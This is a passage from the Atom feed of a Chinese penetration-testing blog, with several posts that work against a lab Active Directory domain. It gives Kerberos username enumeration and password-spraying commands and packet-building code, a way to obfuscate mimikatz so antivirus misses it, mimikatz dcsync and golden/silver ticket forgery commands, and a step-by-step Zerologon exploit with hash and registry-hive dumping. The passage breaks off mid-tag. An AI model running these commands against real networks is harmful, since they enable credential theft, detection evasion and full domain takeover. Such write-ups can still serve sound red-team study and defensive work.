    <updated>2020-10-26T08:40:38.415Z</updated>
    
    <content type="html"><![CDATA[<p>拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>domain:hacke.testlab(192.168.43.100)<br>win2008:192.168.43.110</p><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p><img src="/2020/10/26/kerberos-brute/kerberos.png" alt><br>一般情况下我们的KDC就是DC</p><h1 id="域用户爆破"><a href="#域用户爆破" class="headerlink" title="域用户爆破"></a>域用户爆破</h1><h2 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h2><p>基于golang编写的一款爆破工具，支持域内用户名枚举、密码爆破，支持win/linux。</p><p>github:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ropnop/kerbrute.git</span><br></pre></td></tr></table></figure></p><p>下载好之后用golang进行编译<br><img src="/2020/10/26/kerberos-brute/gobuild.png" alt></p><p>会生成<strong>kerbrute.exe</strong></p><p>放到域内机器执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">kerbrute.exe userenum -d dc.local username.txt</span><br><span class="line">#密码喷洒</span><br><span class="line">kerbrute.exe passwordspray -d dc.local username.txt password</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/enum.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordspray.png" alt></p><h2 id="pykerbrute"><a href="#pykerbrute" class="headerlink" title="pykerbrute"></a>pykerbrute</h2><p>三好学生编写的py脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">EnumADUser.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br><span class="line">#密码喷洒</span><br><span class="line">ADPwdSpray.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;file&gt; &lt;passwordtype&gt; &lt;data&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/py.png" alt><br><img src="/2020/10/26/kerberos-brute/py.png" alt></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>其实就是发送认证的包，抓取返回值(原理文章后面有写)<br>这里看EnumADUser.py<br>AS-REQ结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def build_req_body(realm, service, host, nonce, cname=None):</span><br><span class="line"> </span><br><span class="line">    req_body = KdcReqBody()</span><br><span class="line"></span><br><span class="line">    # (Forwardable, Proxiable, Renewable, Canonicalize)</span><br><span class="line">#   req_body[&apos;kdc-options&apos;] = &quot;&apos;01010000100000000000000000000000&apos;B&quot;</span><br><span class="line">    req_body[&apos;kdc-options&apos;] = &quot;&apos;00000000000000000000000000010000&apos;B&quot;</span><br><span class="line">    if cname is not None:</span><br><span class="line">        req_body[&apos;cname&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;]</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-type&apos;] = NT_PRINCIPAL</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;][0] = cname</span><br><span class="line"></span><br><span class="line">    req_body[&apos;realm&apos;] = realm</span><br><span class="line"></span><br><span class="line">    req_body[&apos;sname&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-type&apos;] = NT_SRV_INST</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][0] = service</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][1] = host</span><br><span class="line"></span><br><span class="line">    req_body[&apos;till&apos;] = &apos;19700101000000Z&apos;</span><br><span class="line">    </span><br><span class="line">    req_body[&apos;nonce&apos;] = nonce</span><br><span class="line"></span><br><span class="line">    req_body[&apos;etype&apos;] = None</span><br><span class="line">    req_body[&apos;etype&apos;][0] = RC4_HMAC</span><br><span class="line">    </span><br><span class="line">    return req_body</span><br></pre></td></tr></table></figure></p><p>进行封装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def build_as_req(target_realm, user_name, nonce):</span><br><span class="line">    req_body = build_req_body(target_realm, &apos;krbtgt&apos;, target_realm, nonce, cname=user_name)</span><br><span class="line"></span><br><span class="line">    as_req = AsReq()</span><br><span class="line"></span><br><span class="line">    as_req[&apos;pvno&apos;] = 5</span><br><span class="line">    as_req[&apos;msg-type&apos;] = 10</span><br><span class="line"></span><br><span class="line">    as_req[&apos;padata&apos;] = None</span><br><span class="line"></span><br><span class="line">    as_req[&apos;req-body&apos;] = _v(4, req_body)</span><br><span class="line">    print(as_req)</span><br><span class="line"></span><br><span class="line">    return as_req</span><br></pre></td></tr></table></figure></p><p>发送请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def send_req_tcp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    data = pack(&apos;&gt;I&apos;, len(data)) + data</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br><span class="line"></span><br><span class="line">def send_req_udp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br></pre></td></tr></table></figure></p><p>接收请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def recv_rep_tcp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            if datalen is None:</span><br><span class="line">                datalen = unpack(&apos;&gt;I&apos;, rep[:4])[0]</span><br><span class="line">            if len(data) &gt;= 4 + datalen:</span><br><span class="line">                sock.close()</span><br><span class="line">                return data[4:4 + datalen]</span><br><span class="line"></span><br><span class="line">def recv_rep_udp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            sock.close()</span><br><span class="line">            return data</span><br></pre></td></tr></table></figure></p><p>验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def checkuser_tcp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_tcp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_tcp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br><span class="line"></span><br><span class="line">def checkuser_udp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_udp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_udp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br></pre></td></tr></table></figure></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用win2008登陆域用户，会向我们的域控发起认证请求</p><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>在认证过程中，若用户名不存在，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/unknownuser2.png" alt><br><img src="/2020/10/26/kerberos-brute/unknownuser.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户不存在：</span><br><span class="line">error_code:eRR-C-PRINCIPALL-UNKNOWN</span><br><span class="line">用户存在：</span><br><span class="line">error_code:eRR-PREAUTH-REQUIRED</span><br></pre></td></tr></table></figure><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>在认证过程中，若密码错误，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/passwordrequire.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordrequire2.png" alt><br>特征：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_code:eRR-PREAUTH-FAILED</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/8187" title="https://xz.aliyun.com/t/8187" target="_blank" rel="noopener">内网渗透之kerberos协议分析</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" title="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" target="_blank" rel="noopener">这是一篇“不一样”的真实渗透测试案例分析文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;domain:hacke.testlab(19
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz简单免杀</title>
    <link href="http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/"/>
    <id>http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/</id>
    <published>2020-10-10T04:43:43.000Z</published>
    <updated>2020-10-10T07:44:27.765Z</updated>
    
    <content type="html"><![CDATA[<p>传送门：<a href="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/" title="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/">【原版mimikatz编译】</a></p><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p><a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" title="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" target="_blank" rel="noopener">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</a></p><p><a href="https://github.com/upx/upx" title="https://github.com/upx/upx" target="_blank" rel="noopener">https://github.com/upx/upx</a><br>混淆-&gt;upx加壳</p><p>卡巴的每次都要重新编译，upx加壳</p><p><img src="/2020/10/10/Obfuscate-Mimikatz/kabasiji.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/360.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/huorong.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/symantec.png" alt></p><p>upx过后的大小在800kb左右</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;传送门：&lt;a href=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/&quot; title=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%
      
    
    </summary>
    
    
    
      <category term="免杀" scheme="http://sherlocz.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>kerberos协议中的票据传递攻击</title>
    <link href="http://sherlocz.github.io/2020/09/20/kerberos-PtT/"/>
    <id>http://sherlocz.github.io/2020/09/20/kerberos-PtT/</id>
    <published>2020-09-19T16:08:10.000Z</published>
    <updated>2020-09-19T17:53:25.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PtT"><a href="#PtT" class="headerlink" title="PtT"></a>PtT</h1><p>Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做<strong>权限维持</strong></p><h1 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>client端在和KDC进行认证的过程中，TGT是由域内krbtgt用户hash计算生成，所以当我们得到了域内krbtgt用户的NTLM 哈希或AES-256的值，可以将权限伪装成任意域内用户(包括域管用户)。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.要伪装的域内用户名</span><br><span class="line">2.krbtgt用户hash</span><br><span class="line">3.krbtgt用户sid</span><br><span class="line">4.域名</span><br></pre></td></tr></table></figure></p><p>利用mimikatz可以进行伪造</p><p>首先我们要知道krbtgt的相关信息，在域控制器中执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/1.png" alt></p><p>获取到sid(sid去除id后面的502)和ntlm hash如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid:S-1-5-21-306775267-2343279330-10040798</span><br><span class="line">hash:8fe2af5ffd00a2b58a9a42c8c95ee373</span><br></pre></td></tr></table></figure></p><p>接下来在域内一台机器上生成Golden Ticket：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:hacke\administrator /domain:hacke.testlab/sid:S-1-5-21-306775267-2343279330-10040798 /krbtgt:8fe2af5ffd00a2b58a9a42c8c95ee373 /ptt  </span><br><span class="line"></span><br><span class="line">kerberos::ptt C:\Users\oreo\Desktop\ticket.kirbi #导入票据</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/2.png" alt></p><p>成功导入，可以利用cmd下的klist命令查看导入的票据。</p><p>这里导入票据之后，我们可以看下是否能够伪造身份：</p><p><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><p>dir 域控的目录，能够成功访问，说明票据成功</p><h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>伪造ST服务票据，不需要和KDC进行交互，动静较小</p><h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的用户名</span><br><span class="line">2.用户hash</span><br><span class="line">3.用户sid</span><br></pre></td></tr></table></figure></p><p>首先我们用mimikatz来读取计算机的hash<br><img src="/2020/09/20/kerberos-PtT/4.png" alt></p><p>获取sid<br><img src="/2020/09/20/kerberos-PtT/5.png" alt><br>在域内任意一台机器上制作Silver Ticket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-306775267-2343279330-10040798 /target:dc.hacke.testlab /service:cifs /rc4:&#123;ntlm hash&#125; /user:administrator /ptt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/6.png" alt></p><p>再次访问dc的c$<br><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>当我们使用票据成功后，后续可使用psexec.exe与目标机器进行交互cmd shell</p><p><a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe" target="_blank" rel="noopener">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p><p>不过这两个都是属于后门维持的攻击，还是MS14-068好用啊</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PtT&quot;&gt;&lt;a href=&quot;#PtT&quot; class=&quot;headerlink&quot; title=&quot;PtT&quot;&gt;&lt;/a&gt;PtT&lt;/h1&gt;&lt;p&gt;Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做&lt;strong&gt;权限维持&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472(域内提权)漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/09/16/CVE-2020-1472/"/>
    <id>http://sherlocz.github.io/2020/09/16/CVE-2020-1472/</id>
    <published>2020-09-16T08:41:58.000Z</published>
    <updated>2020-09-17T16:49:43.062Z</updated>
    
    <content type="html"><![CDATA[<p>2020年9月16日 星期二  阴</p><p>深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明天又要穿上白衬衫，继续假装自己是5年工作经验的安全专家，今晚终于认清现实，活捉红队0day依然是我们遥不可及的梦。</p><p>生而为人，谁都是第一次。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">简单的域环境搭建</a></p><p>发现环境还有，稍微改了一下：</p><ul><li>Domain:hacke</li><li>Windows server 2012(DC) 192.168.43.100</li><li>Windows server 2008    192.168.43.101</li><li>Windows7    192.168.43.102</li><li>Kali(攻击机器)    192.168.43.105</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用过程：将域控密码设置为空-&gt;读取hash-&gt;读取sam文件hash(ntds.dit)-&gt;恢复域控密码</p><p>要安装impacket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure></p><p>下载我们的poc(下文有下载连接)<br>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &#123;computer name&#125; &#123;ip&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/1.png" alt></p><p>执行成功之后，密码就会修改为空(修改的是域控的机器密码，不是域控的密码)，接下来用impacket中的/impacket/examples/secretsdump.py来读取域控中的hash</p><p><img src="/2020/09/16/CVE-2020-1472/2.png" alt></p><p>当我们获取了hash之后(这里应该是域管的)，我们可以读取域控制器中sam文件的hash，用来获取之前机器的原始密码(<a href="读取SAM和SYSTEM文件中的NTLM-HASH" title="https://sherlocz.github.io/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/">读取SAM和SYSTEM文件中的NTLM-HASH</a>)</p><p>通过wmiexec执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ython3 wmiexec.py -hashes xxxxxx hacke/Administrator@192.168.43.100</span><br></pre></td></tr></table></figure></p><p>然后将三个文件搞下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">get sam.hive</span><br><span class="line">get system.hive</span><br><span class="line">get security.hive</span><br></pre></td></tr></table></figure></p><p>读取sam里面的hash：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive  LOCAL</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/4.png" alt><br>居然吧我之前修改过的历史密码也读取出来了，也不知道为啥 == </p><p>最后，利用脚本传入hash，恢复之前的密码<br><img src="/2020/09/16/CVE-2020-1472/5.png" alt></p><p>再来检查密码是否正确(之前修改后密码为空)<br><img src="/2020/09/16/CVE-2020-1472/6.png" alt></p><p><img src="/2020/09/16/CVE-2020-1472/7.png" alt></p><h1 id="Poc-Exp"><a href="#Poc-Exp" class="headerlink" title="Poc/Exp"></a>Poc/Exp</h1><p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">https://github.com/risksense/zerologon</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><a 